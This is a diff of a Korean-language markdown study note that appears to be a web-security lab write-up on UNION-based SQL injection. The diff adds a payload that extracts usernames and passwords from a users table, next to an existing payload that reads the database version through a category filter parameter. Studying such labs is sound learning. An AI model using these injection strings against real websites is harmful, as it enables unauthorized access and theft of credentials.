@@ -1,6 +1,6 @@
-# 🔐 UNION — DB 버전 탈취
+# 🔐 UNION — 데이터 탈취
 
-**목표**: 카테고리 필터를 우회하여 웹 페이지에 DB 버전 노출 
+**목표**: 카테고리 필터를 우회하여 웹 페이지에 DB 버전, 개인 정보 등 노출 
 
 <br />
 
@@ -29,13 +29,24 @@
 
 <br />
 
-3️⃣ **버전 추출**: DB별 버전 함수/변수 사용
+3️⃣ **데이터 탈취**
+
+**DB별 버전 함수/변수 사용:**
 
 ```text
 /filter?category=Pets' union select @@version, null#
 ```
 
 <img width="200" height="60" alt="image" src="https://github.com/user-attachments/assets/b0f3c417-2eb3-454f-999d-2e9fe74e6a10" />
+
+<br />
+
+**users 테이블에서 다른 로그인 계정 탈취:**
+```text
+/filter?category=Lifestyle' union select username, password from users --
+```
+<img width="340" height="400" alt="image" src="https://github.com/user-attachments/assets/aaac76e9-f7c9-4f5a-9322-09d8ac444000" />
+
 
 <br /><br />
 
